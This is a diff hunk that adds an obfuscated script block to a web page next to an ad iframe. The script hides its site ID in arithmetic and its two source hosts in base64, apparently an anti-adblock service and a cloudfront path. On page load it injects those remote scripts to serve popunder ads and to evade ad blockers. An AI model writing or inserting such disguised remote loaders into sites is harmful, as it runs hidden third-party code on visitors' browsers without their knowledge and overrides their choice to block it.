@@ -59,6 +59,54 @@ function isInIframe() {
 
 <iframe id="adx1" src="" height="768" width="1366" ></iframe>
 
+<script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+
+	(function() {
+    var s = window,
+        l = "e159c2fe33559c30f4f1e97a90794c86",
+        w = [
+            ["siteId", 485 * 454 + 1 * 430 - 941 + 5082474],
+            ["minBid", 0],
+            ["popundersPerIP", "0"],
+            ["delayBetween", 0],
+            ["default", false],
+            ["defaultPerDay", 0],
+            ["topmostLayer", "auto"]
+        ],
+        r = ["d3d3LmFudGlhZGJsb2Nrc3lzdGVtcy5jb20vSnFLL2tsb3phZC5taW4uanM=", "ZDNjb2Q4MHRobjdxbmQuY2xvdWRmcm9udC5uZXQveWRUUG5HL2cvZWZsb2F0aW5nLmNzcw=="],
+        h = -1,
+        d, e, i = function() {
+            clearTimeout(e);
+            h++;
+            if (r[h] && !(1813378149000 < (new Date).getTime() && 1 < h)) {
+                d = s.document.createElement("script");
+                d.type = "text/javascript";
+                d.async = !0;
+                var g = s.document.getElementsByTagName("script")[0];
+                d.src = "https://" + atob(r[h]);
+                d.crossOrigin = "anonymous";
+                d.onerror = i;
+                d.onload = function() {
+                    clearTimeout(e);
+                    s[l.slice(0, 16) + l.slice(0, 16)] || i()
+                };
+                e = setTimeout(i, 5E3);
+                g.parentNode.insertBefore(d, g)
+            }
+        };
+    if (!s[l]) {
+        try {
+            Object.freeze(s[l] = w)
+        } catch (e) {}
+        i()
+    }
+})();
+	
+/*]]>/* */
+</script>
+
+	
 <script>
 
 
